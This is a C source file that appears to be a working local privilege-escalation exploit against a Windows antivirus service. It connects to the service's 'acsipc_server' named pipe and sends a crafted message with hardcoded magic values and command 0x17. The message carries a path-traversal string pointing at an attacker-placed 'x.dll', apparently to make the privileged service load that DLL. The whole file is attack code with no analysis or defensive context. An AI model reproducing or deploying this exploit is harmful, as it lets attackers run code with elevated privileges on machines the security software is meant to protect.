#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "Advapi32.lib")

HANDLE GetNamedPipeHandle()
{
	SECURITY_DESCRIPTOR sd = {0};
	InitializeSecurityDescriptor(&sd, 1);
	SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
	SECURITY_ATTRIBUTES sa = {0};
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = &sd;
	sa.bInheritHandle = NULL;
	
	HANDLE h = CreateFile(TEXT("\\\\.\\pipe\\acsipc_server"), 
0xC0000000, 3, 
		&sa, 3, 0x80000080, NULL);
	if(h != (HANDLE)-1 )
		return h;

	return NULL;
}

void RunCommand(HANDLE handle, BYTE command, BYTE * data, DWORD dataLen)
{
	DWORD table[] = {0xd48a445e, 0x466e1597, 0x327416ba, 
0x68ccde15};

		DWORD bufferLen = 0x28+dataLen;
		BYTE  * buffer = (BYTE*)malloc(bufferLen);
		//memset(buffer, 0x50, 0x1000);
		*(DWORD*)buffer = table[0];
		*(DWORD*)(buffer+4) = table[1];
		*(DWORD*)(buffer+8) = table[2];
		*(DWORD*)(buffer+0xc) = table[3];		
		*(DWORD*)(buffer+0x10) = command;
		*(DWORD*)(buffer+0x14) = 0x30303030;
		*(DWORD*)(buffer+0x18) = dataLen;
		*(DWORD*)(buffer+0x1c) = 0x0;
		*(DWORD*)(buffer+0x20) = 0x0;
		*(DWORD*)(buffer+0x24) = 0x0;
		memcpy(buffer+0x28, data, dataLen);		
		DWORD dwB;
		WriteFile(handle, buffer, bufferLen, &dwB, NULL);					
		free(buffer);
}


void GetDirectory(WCHAR * path)
{
	int len = -1;
	for(int i = wcslen(path); path[i] != L'\\' ; i-=1)
	{		
		len++;
	}
	path[wcslen(path) - len] = 0x00;
}


int main(int argc, char ** argv)
{
	WCHAR current_path[MAX_PATH];
	GetModuleFileNameW(NULL, current_path, MAX_PATH);	
	GetDirectory(current_path);
	wcscat(current_path, L"x.dll");				
	GetShortPathNameW(current_path, current_path, MAX_PATH);
  

	WCHAR * traversal = (WCHAR*)malloc(MAX_PATH*2);
	memset(traversal, 0, MAX_PATH*2);
	
	for(int j = 0; j < 10; j++)
		wcscat(traversal, L"\\..");
	wcscat(traversal, current_path+2);		
	//wprintf(L"TRYING: %s\n", traversal);
		
	DWORD dataLen = wcslen(traversal)*2+2+0x14;		
	BYTE *data = (BYTE*)malloc(dataLen);
	memset(data, 0, dataLen);		
	memcpy(data+0x11, traversal, wcslen(traversal)*2+2);
	HANDLE handle = GetNamedPipeHandle();
	if(handle)
	{
		RunCommand(handle, 0x17, data, dataLen);		
	}
	else
	{
		printf("Unable to get handler, may be the antivirus 
service is down!\n");
	}
	free(data);		
	free(traversal);		
}
